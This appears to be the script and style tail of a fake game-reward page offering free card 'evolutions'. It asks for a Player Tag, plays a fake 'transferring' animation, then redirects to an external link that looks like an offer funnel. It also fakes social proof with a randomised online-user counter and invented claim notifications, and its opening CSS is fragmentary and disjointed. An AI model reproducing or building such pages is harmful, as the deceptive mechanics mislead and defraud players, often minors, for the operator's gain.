            left: 0;

            z-index: -10;
            overflow: hidden;

        /* Vignette effect */

            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;

            height: 100px;

        .loading-animation div:nth-child(8) { animation-delay: 0.7s; }
        .loading-animation div:nth-child(9) { animation-delay: 0.8s; }
        @keyframes pulse {
            0%, 100% { opacity: 0.3; transform: scale(0.8); }

            }
            .notification {
                width: 280px;
                right: 0.5rem;
            }
        }

            gainNode.connect(audioContext.destination);

            document.getElementById('transferringModal').classList.add('show');
            document.body.style.overflow = 'hidden';
        }

        function hideTransferringModal() {
            document.getElementById('transferringModal').classList.remove('show');
        }

        // Modal functions
        function showModal(item) {
            selectedItem = item;
            playClickSound();
            document.getElementById('modal').classList.add('show');
            document.body.style.overflow = 'hidden';
            resetModal();
        }

        function hideModal() {
            document.getElementById('modal').classList.remove('show');
            document.body.style.overflow = 'auto';
            resetModal();
        }

        function resetModal() {
            document.getElementById('step1').classList.remove('hidden');
            document.getElementById('usernameInput').value = '';
            document.getElementById('actionBtn').textContent = 'Evolve Card';
            document.getElementById('actionBtn').disabled = false;
        }

        function actionStep() {
            playClickSound();
            const usernameInput = document.getElementById('usernameInput');
            const username = usernameInput.value.trim();
            const actionBtn = document.getElementById('actionBtn');

            if (username) {
                actionBtn.textContent = 'Evolving...';
                actionBtn.disabled = true;

                hideModal();
                showTransferringModal(selectedItem.name);

                setTimeout(() => {
                    hideTransferringModal();
                    resetModal();
                    window.location.href = 'https://plaiovagames.site/cl/i/podxr5';
                }, 2000);
            } else {
                alert('Please enter your Player Tag.');
            }
        }

        // Function to handle image loading errors
        function handleImageError(img, fallbackText) {
            img.style.display = 'none';
            const fallback = document.createElement('div');
            fallback.className = 'image-fallback';
            fallback.textContent = fallbackText;
            img.parentNode.appendChild(fallback);
        }

        // Initialize items grid
        function initializeItemsGrid() {
            const grid = document.getElementById('itemsGrid');
            items.forEach(item => {
                const li = document.createElement('li');
                li.className = 'item-card';
                li.innerHTML = `
                    <img alt="${item.name}" class="item-image" src="${item.image}">
                    <p class="item-name">${item.name}</p>
                `;
                
                // Add error handling for images
                const img = li.querySelector('.item-image');
                img.onerror = function() {
                    handleImageError(this, item.name.split(' ')[0]);
                };
                
                li.addEventListener('click', () => showModal(item));
                grid.appendChild(li);
            });
        }

        // Initialize mystical background elements
        function initializeBackgroundElements() {
            const background = document.getElementById('background');
            
            // Create energy lines
            for (let i = 0; i < 5; i++) {
                const line = document.createElement('div');
                line.className = 'energy-line';
                line.style.top = `${20 + i * 20}%`;
                line.style.width = `${50 + Math.random() * 50}%`;
                line.style.left = `${Math.random() * 50}%`;
                line.style.transform = `rotate(${Math.random() * 30 - 15}deg)`;
                line.style.opacity = 0.1 + Math.random() * 0.2;
                background.appendChild(line);
                
                backgroundElements.push({
                    element: line,
                    type: 'line',
                    animationSpeed: 0.1 + Math.random() * 0.3,
                    animationPhase: Math.random() * Math.PI * 2
                });
            }
            
            // Create light particles
            for (let i = 0; i < 20; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                const size = 2 + Math.random() * 4;
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                particle.style.left = `${Math.random() * 100}%`;
                particle.style.top = `${Math.random() * 100}%`;
                particle.style.opacity = 0.2 + Math.random() * 0.5;
                background.appendChild(particle);
                
                backgroundElements.push({
                    element: particle,
                    type: 'particle',
                    x: Math.random() * window.innerWidth,
                    y: Math.random() * window.innerHeight,
                    speed: 0.2 + Math.random() * 0.5,
                    direction: Math.random() * Math.PI * 2,
                    size: size
                });
            }
            
            // Create light shards
            for (let i = 0; i < 10; i++) {
                const shard = document.createElement('div');
                shard.className = 'light-shard';
                shard.style.left = `${Math.random() * 100}%`;
                shard.style.top = `${Math.random() * 100}%`;
                shard.style.opacity = 0.1 + Math.random() * 0.3;
                shard.style.transform = `rotate(${Math.random() * 360}deg)`;
                background.appendChild(shard);
                
                backgroundElements.push({
                    element: shard,
                    type: 'shard',
                    x: Math.random() * window.innerWidth,
                    y: Math.random() * window.innerHeight,
                    speed: 0.1 + Math.random() * 0.3,
                    direction: Math.random() * Math.PI * 2,
                    rotation: Math.random() * 360,
                    rotationSpeed: Math.random() * 2 - 1
                });
            }
        }

        // Initialize floating icons
        function initializeFloatingIcons() {
            const background = document.getElementById('background');
            floatingIcons.forEach((iconUrl, index) => {
                const element = document.createElement('div');
                element.className = 'floating-icon';

                const img = document.createElement('img');
                img.src = iconUrl;
                img.alt = 'Floating Character';
                
                // Add error handling for floating icons
                img.onerror = function() {
                    this.style.display = 'none';
                    const fallback = document.createElement('div');
                    fallback.className = 'image-fallback';
                    fallback.textContent = 'Icon';
                    element.appendChild(fallback);
                };
                
                element.appendChild(img);

                const floatingData = {
                    id: index,
                    element: element,
                    x: Math.random() * (window.innerWidth - 170),
                    y: Math.random() * (window.innerHeight - 170),
                    speed: 0.5 + Math.random() * 1,
                    direction: Math.random() * Math.PI * 2
                };

                element.style.left = floatingData.x + 'px';
                element.style.top = floatingData.y + 'px';

                floatingElements.push(floatingData);
                background.appendChild(element);
            });
        }

        // Animate background elements
        function animateBackgroundElements() {
            backgroundElements.forEach(elementData => {
                if (elementData.type === 'line') {
                    // Animate energy lines with pulsing effect
                    elementData.animationPhase += elementData.animationSpeed;
                    const opacity = 0.1 + Math.sin(elementData.animationPhase) * 0.1;
                    elementData.element.style.opacity = opacity;
                } else if (elementData.type === 'particle') {
                    // Move particles slowly
                    elementData.x += Math.cos(elementData.direction) * elementData.speed;
                    elementData.y += Math.sin(elementData.direction) * elementData.speed;
                    
                    // Wrap around screen
                    if (elementData.x < 0) elementData.x = window.innerWidth;
                    if (elementData.x > window.innerWidth) elementData.x = 0;
                    if (elementData.y < 0) elementData.y = window.innerHeight;
                    if (elementData.y > window.innerHeight) elementData.y = 0;
                    
                    elementData.element.style.left = elementData.x + 'px';
                    elementData.element.style.top = elementData.y + 'px';
                } else if (elementData.type === 'shard') {
                    // Move and rotate shards
                    elementData.x += Math.cos(elementData.direction) * elementData.speed;
                    elementData.y += Math.sin(elementData.direction) * elementData.speed;
                    elementData.rotation += elementData.rotationSpeed;
                    
                    // Wrap around screen
                    if (elementData.x < 0) elementData.x = window.innerWidth;
                    if (elementData.x > window.innerWidth) elementData.x = 0;
                    if (elementData.y < 0) elementData.y = window.innerHeight;
                    if (elementData.y > window.innerHeight) elementData.y = 0;
                    
                    elementData.element.style.left = elementData.x + 'px';
                    elementData.element.style.top = elementData.y + 'px';
                    elementData.element.style.transform = `rotate(${elementData.rotation}deg)`;
                }
            });
        }

        // Animate floating icons
        function animateFloatingIcons() {
            floatingElements.forEach(elementData => {
                let newX = elementData.x + Math.cos(elementData.direction) * elementData.speed;
                let newY = elementData.y + Math.sin(elementData.direction) * elementData.speed;
                let newDirection = elementData.direction;

                if (newX <= 0 || newX >= window.innerWidth - 170) {
                    newDirection = Math.PI - elementData.direction;
                    newX = Math.max(0, Math.min(newX, window.innerWidth - 170));
                }
                if (newY <= 0 || newY >= window.innerHeight - 170) {
                    newDirection = -elementData.direction;
                    newY = Math.max(0, Math.min(newY, window.innerHeight - 170));
                }

                elementData.x = newX;
                elementData.y = newY;
                elementData.direction = newDirection;

                elementData.element.style.left = newX + 'px';
                elementData.element.style.top = newY + 'px';
            });
        }

        // Notification update logic
        function updateNotification() {
            const notification = document.getElementById('notification');
            const user = document.getElementById('notificationUser');
            const action = document.getElementById('notificationAction');
            const avatar = document.getElementById('notificationAvatar');

            notification.classList.add('fade-out');

            setTimeout(() => {
                currentNotificationIndex = (currentNotificationIndex + 1) % notificationsData.length;
                const current = notificationsData[currentNotificationIndex];

                user.textContent = current.user;
                action.textContent = current.action;
                avatar.src = current.avatar;

                notification.classList.remove('fade-out');
            }, 500);
        }

        // Function to animate online users count
        function animateOnlineUsersCount(start, end, duration) {
            const range = end - start;
            const startTime = performance.now();
            const onlineUsersElement = document.getElementById('onlineUsersCount');

            function step(currentTime) {
                const elapsed = currentTime - startTime;
                const progress = Math.min(elapsed / duration, 1);

                const animatedValue = start + (range * progress);
                onlineUsersElement.textContent = Math.floor(animatedValue).toLocaleString();

                if (progress < 1) {
                    requestAnimationFrame(step);
                } else {
                    onlineUsersElement.textContent = end.toLocaleString();
                    currentOnlineUsers = end;
                }
            }
            requestAnimationFrame(step);
        }

        // Function to update online users count with a new random target
        function updateOnlineUsers() {
            const targetUsers = Math.floor(Math.random() * (maxUsers - minUsers + 1)) + minUsers;
            animateOnlineUsersCount(currentOnlineUsers, targetUsers, 1500);
        }

        // Initialize everything
        function init() {
            initializeItemsGrid();
            initializeBackgroundElements();
            initializeFloatingIcons();

            const notificationUser = document.getElementById('notificationUser');
            const notificationAction = document.getElementById('notificationAction');
            const notificationAvatar = document.getElementById('notificationAvatar');
            const initialNotification = notificationsData[0];
            notificationUser.textContent = initialNotification.user;
            notificationAction.textContent = initialNotification.action;
            notificationAvatar.src = initialNotification.avatar;

            document.getElementById('onlineUsersCount').textContent = currentOnlineUsers.toLocaleString();

            // Start animations
            function animate() {
                animateBackgroundElements();
                animateFloatingIcons();
                animationFrameId = requestAnimationFrame(animate);
            }
            animate();
            
            setInterval(updateNotification, 4000);
            setInterval(updateOnlineUsers, 6000);
        }

        // Event listeners
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('actionBtn').addEventListener('click', actionStep);
            document.getElementById('cancelBtn').addEventListener('click', () => {
                playClickSound();
                hideModal();
            });

            document.getElementById('modal').addEventListener('click', (e) => {
                if (e.target.id === 'modal') {
                    hideModal();
                }
            });

            document.getElementById('transferringModal').addEventListener('click', (e) => {
                if (e.target.classList.contains('transferring-modal')) {
                    hideTransferringModal();
                }
            });

            init();
        });

        // Handle window resize
        window.addEventListener('resize', () => {
            floatingElements.forEach(elementData => {
                elementData.x = Math.min(elementData.x, window.innerWidth - 170);
                elementData.y = Math.min(elementData.y, window.innerHeight - 170);
                if (elementData.element) {
                    elementData.element.style.left = elementData.x + 'px';
                    elementData.element.style.top = elementData.y + 'px';
                }
            });
        });
    </script>
